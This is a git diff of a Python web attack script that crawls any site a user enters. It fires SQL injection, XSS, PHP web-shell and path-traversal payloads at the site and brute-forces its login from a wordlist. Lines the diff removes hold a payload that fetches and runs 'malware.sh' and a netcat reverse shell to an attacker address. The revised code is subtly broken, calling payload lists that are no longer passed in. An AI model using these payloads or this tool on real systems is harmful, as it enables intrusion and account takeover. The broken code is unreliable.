@@ -3,8 +3,7 @@ from bs4 import BeautifulSoup
 import re
 import urllib.parse
 import time
-from selenium import webdriver
-from tqdm import tqdm
+from tqdm import tqdm  # For progress bar
 import os
 
 def display_name():
@@ -16,7 +15,7 @@ def display_name():
     ███████║███████╗███████║██████╔╝██║██╔██╗ ██║███████╗
     ██╔══██║╚════██║██╔══██║██╔══██╗██║██║╚██╗██║╚════██║
     ██║  ██║███████║██║  ██║██║  ██║██║██║ ╚████║███████║
-    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝
+    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═╝  ╚═══╝╚══════╝
     
     Developed by: asadinf\033[0m
     """
@@ -27,17 +26,41 @@ def display_name():
 
 display_name()
 
-def format_url(url):
-    if not (url.startswith("http://") or url.startswith("https://")):
-        url = "https://" + url
-    if not (url.startswith("www.") or "://" in url):
-        url = "www." + url
-    return url
+def get_default_payloads():
+    sql_payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "' OR '1'='1' #",
+        "' UNION SELECT NULL, NULL, NULL --",
+        "' UNION SELECT 1, @@version, 3 --"
+    ]
 
-def save_to_file(filename, data):
-    with open(filename, 'w') as file:
-        for item in data:
-            file.write(f"{item}\n")
+    xss_payloads = [
+        "<script>alert('XSS')</script>",
+        "'\"><img src=x onerror=alert(1)>",
+        "<body onload=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "<img src='x' onerror='alert(1)'>"
+    ]
+
+    rce_payloads = [
+        "phpinfo();",
+        "<?php system($_GET['cmd']); ?>",
+        "<?php exec($_GET['cmd']); ?>",
+        "<?php passthru($_GET['cmd']); ?>",
+        "<?php shell_exec($_GET['cmd']); ?>"
+    ]
+
+    fuzz_payloads = [
+        "../../../../../etc/passwd",
+        "../../../../../../etc/passwd",
+        "index.php?id=1' OR '1'='1",
+        "index.php?id=1' AND sleep(5)--",
+        "index.php?id=<script>alert(1)</script>"
+    ]
+
+    return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads
 
 def find_links(url):
     try:
@@ -54,10 +77,10 @@ def find_links(url):
         print(f"Error fetching links from {url}: {e}")
         return set()
 
-def sql_injection_test(url, params, payloads):
+def sql_injection_test(url, params, sql_payloads):
     vulnerable = False
     
-    for payload in payloads:
+    for payload in sql_payloads:
         for param in params:
             test_params = params.copy()
             test_params[param] = payload
@@ -71,10 +94,10 @@ def sql_injection_test(url, params, payloads):
     if not vulnerable:
         print("No SQL Injection vulnerabilities found.")
 
-def xss_test(url, params, payloads):
+def xss_test(url, params, xss_payloads):
     vulnerable = False
 
-    for payload in payloads:
+    for payload in xss_payloads:
         for param in params:
             test_params = params.copy()
             test_params[param] = payload
@@ -88,6 +111,19 @@ def xss_test(url, params, payloads):
     if not vulnerable:
         print("No XSS vulnerabilities found.")
 
+def rce_test(url, rce_payloads):
+    vulnerable = False
+
+    for payload in rce_payloads:
+        response = requests.get(url + payload)
+        if "phpinfo" in response.text or "system" in response.text:
+            print(f"Possible Remote Code Execution vulnerability found with payload: {payload}")
+            vulnerable = True
+            break
+
+    if not vulnerable:
+        print("No Remote Code Execution vulnerabilities found.")
+
 def analyze_headers(url):
     response = requests.get(url)
     headers = response.headers
@@ -98,13 +134,10 @@ def analyze_headers(url):
     if 'Strict-Transport-Security' not in headers:
         print(f"Strict-Transport-Security header missing on {url}")
 
-def form_analysis(url, sql_payloads, xss_payloads):
+def form_analysis(url):
     try:
         response = requests.get(url)
         soup = BeautifulSoup(response.text, "html.parser")
-        urls = set()
-        usernames = set()
-        vulnerabilities = set()
 
         for form in soup.find_all('form'):
             action = form.get('action')
@@ -124,124 +157,8 @@ def form_analysis(url, sql_payloads, xss_payloads):
             sql_injection_test(form_url, form_data, sql_payloads)
             xss_test(form_url, form_data, xss_payloads)
 
-            urls.add(form_url)
-            for field in form_data.keys():
-                if "email" in field.lower():
-                    usernames.add(form_data[field])
-                if "username" in field.lower():
-                    usernames.add(form_data[field])
-
-        return urls, usernames, vulnerabilities
-
     except Exception as e:
         print(f"Error analyzing forms on {url}: {e}")
-        return set(), set(), set()
-
-def parameter_fuzzing(url, params, payloads):
-    vulnerable = False
-
-    for payload in payloads:
-        for param in params:
-            test_params = params.copy()
-            test_params[param] = payload
-
-            response = requests.get(url, params=test_params)
-            if payload in response.text:
-                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
-                vulnerable = True
-
-    if not vulnerable:
-        print("No vulnerabilities found with parameter fuzzing.")
-
-def rce_test(url, params, payloads):
-    vulnerable = False
-
-    for payload in payloads:
-        for param in params:
-            test_params = params.copy()
-            test_params[param] = payload
-
-            response = requests.get(url, params=test_params)
-            if "RCE" in response.text:
-                print(f"Possible RCE vulnerability found with payload: {payload} on param: {param}")
-                vulnerable = True
-                break
-
-    if not vulnerable:
-        print("No RCE vulnerabilities found.")
-
-def deep_crawl_with_selenium(url):
-    driver = webdriver.Firefox()
-    driver.get(url)
-    time.sleep(3)
-
-    page_source = driver.page_source
-    soup = BeautifulSoup(page_source, 'html.parser')
-
-    links = set()
-    for a_tag in soup.find_all('a', href=True):
-        link = urllib.parse.urljoin(url, a_tag['href'])
-        if url in link:
-            links.add(link)
-    
-    driver.quit()
-    return links
-
-def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist=None):
-    formatted_url = format_url(url)
-    base_domain = urllib.parse.urlparse(formatted_url).netloc.split('.')[0]
-    
-    all_urls = set()
-    all_usernames = set()
-    all_vulnerabilities = set()
-
-    links = find_links(formatted_url)
-    deep_links = deep_crawl_with_selenium(formatted_url)
-    links.update(deep_links)
-
-    total_links = len(links)
-    print(f"Found {total_links} links. Starting scan...")
-
-    for i, link in enumerate(tqdm(links, desc="Scanning", unit="link")):
-        print(f"Scanning {link} ...")
-        analyze_headers(link)
-        urls, usernames, vulnerabilities = form_analysis(link, sql_payloads, xss_payloads)
-        all_urls.update(urls)
-        all_usernames.update(usernames)
-        all_vulnerabilities.update(vulnerabilities)
-        parameter_fuzzing(link, {}, fuzz_payloads)
-        rce_test(link, {}, rce_payloads)
-        time.sleep(1)
-
-    save_to_file(f'{base_domain}_all_urls.txt', all_urls)
-    save_to_file(f'{base_domain}_all_usernames_mail.txt', all_usernames)
-    save_to_file(f'{base_domain}_vulnerabilities.txt', all_vulnerabilities)
-
-    if wordlist:
-        print("Starting brute force attack...")
-        brute_force_login(formatted_url, 'username', 'password', wordlist)
-
-def get_default_payloads():
-    sql_payloads = [
-        "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #",
-        "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, username, password FROM users --",
-        "' OR 1=1--", "' OR 'a'='a", "1' OR 'a'='a", "' OR '1'='1' /*", "' OR '1'='1' --",
-        "1' AND 1=1", "' AND 1=1", "' AND '1'='1"
-    ]
-    xss_payloads = [
-        "<script>alert('XSS')</script>", "'\"><img src=x onerror=alert(1)>", "<body onload=alert(1)>",
-        "<img src='x' onerror='alert(1)'>", "<svg/onload=alert(1)>", "<iframe src='javascript:alert(1)'></iframe>",
-        "<a href='javascript:alert(1)'>click me</a>"
-    ]
-    rce_payloads = [
-        "; ls", "; cat /etc/passwd", "; uname -a", "; id", "; whoami", "; wget http://malicious.com/malware.sh -O /tmp/malware.sh; sh /tmp/malware.sh",
-        "; nc -e /bin/sh attacker_ip attacker_port", "<?php system($_GET['cmd']); ?>"
-    ]
-    fuzz_payloads = [
-        "../../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>", "<?php phpinfo(); ?>",
-        "<img src='x' onerror='alert(1)'>", "admin' --", "' OR 1=1 --", "' OR 'a'='a"
-    ]
-    return sql_payloads, xss_payloads, rce_payloads, fuzz_payloads
 
 def brute_force_login(url, username_param, password_param, wordlist):
     with open(wordlist, 'r') as file:
@@ -260,6 +177,51 @@ def brute_force_login(url, username_param, password_param, wordlist):
             break
         else:
             print(f"Attempted with password: {password}")
+
+def parameter_fuzzing(url, params, fuzz_payloads):
+    vulnerable = False
+
+    for payload in fuzz_payloads:
+        for param in params:
+            test_params = params.copy()
+            test_params[param] = payload
+
+            response = requests.get(url, params=test_params)
+            if payload in response.text:
+                print(f"Parameter fuzzing found possible vulnerability with payload: {payload} on param: {param}")
+                vulnerable = True
+
+    if not vulnerable:
+        print("No vulnerabilities found with parameter fuzzing.")
+
+def scan_website(url, sql_payloads, xss_payloads, rce_payloads, fuzz_payloads, wordlist=None):
+    domain_name = urllib.parse.urlparse(url).netloc.replace('.', '_')
+    urls_file = f"{domain_name}_all_urls.txt"
+    usernames_file = f"{domain_name}_all_usernames_mail.txt"
+    vulnerabilities_file = f"{domain_name}_vulnerabilities.txt"
+
+    links = find_links(url)
+
+    with open(urls_file, 'w') as file:
+        for link in tqdm(links, desc="Saving URLs"):
+            file.write(link + '\n')
+
+    if wordlist:
+        with open(usernames_file, 'w') as file:
+            print("Starting brute force attack...")
+            brute_force_login(url, 'username', 'password', wordlist)
+            # Add brute force results to the file if needed
+
+    with open(vulnerabilities_file, 'w') as file:
+        for link in tqdm(links, desc="Scanning Links"):
+            print(f"Scanning {link} ...")
+            analyze_headers(link)
+            form_analysis(link)
+            rce_test(link, rce_payloads)
+            parameter_fuzzing(link, {}, fuzz_payloads)  # You need to modify this based on your needs
+            time.sleep(1)
+
+    print("Scan completed.")
 
 if __name__ == "__main__":
     website_url = input("Enter the website URL (e.g., https://google.com): ")
